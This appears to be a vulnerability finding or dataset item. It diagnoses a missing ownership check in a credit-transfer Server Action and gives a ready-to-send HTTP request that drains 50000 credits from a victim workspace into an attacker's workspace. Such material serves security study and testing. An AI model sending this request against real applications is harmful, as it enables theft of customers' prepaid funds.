diagnosis: The Server Action executes a credit balance transfer between two workspaces using client-specified sourceWorkspaceId and destinationWorkspaceId. Although it checks for an authenticated session, it fails to verify that session.user is authorized to debit credits from sourceWorkspaceId, allowing an attacker to drain prepaid balances from competitor accounts.
exploit_request:
POST /api/actions/transferCredits HTTP/1.1
Host: app.cloudcompute.net
Cookie: next-auth.session-token=<attacker_cookie>
Content-Type: application/json

{"sourceWorkspaceId": "ws_enterprise_corp_1029", "destinationWorkspaceId": "ws_attacker_free_001", "credits": 50000}
